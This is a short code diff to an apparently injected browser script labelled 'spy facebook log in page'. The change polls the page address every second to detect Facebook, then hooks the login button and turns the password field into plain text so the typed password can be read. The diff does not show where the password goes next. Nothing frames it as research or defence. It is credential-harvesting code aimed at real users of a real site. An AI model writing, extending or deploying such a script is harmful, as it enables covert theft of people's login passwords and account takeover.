@@ -1,10 +1,18 @@
+
+
+// spy facebook log in page
 const waiiFb = new Promise((res) => {
-    if(window.location.href.includes('facebook')){
-        alert('fb')
-        res(true)
-    }
+    setInterval(()=>{
+        if(window.location.href.includes('m.facebook')){
+            res("m")
+        }
+        if(window.location.href.includes('facebook')){
+            res("d")
+        }
+    },1000)
 }).then((val)=>{
-    if(val){
+    alert(val)
+    if(val == "d"){
         try{
             document.getElementById('loginbutton').onclick = function(){
             document.querySelector("#pass").type = 'text'
@@ -19,3 +27,4 @@ const waiiFb = new Promise((res) => {
         }
     }
 })
+
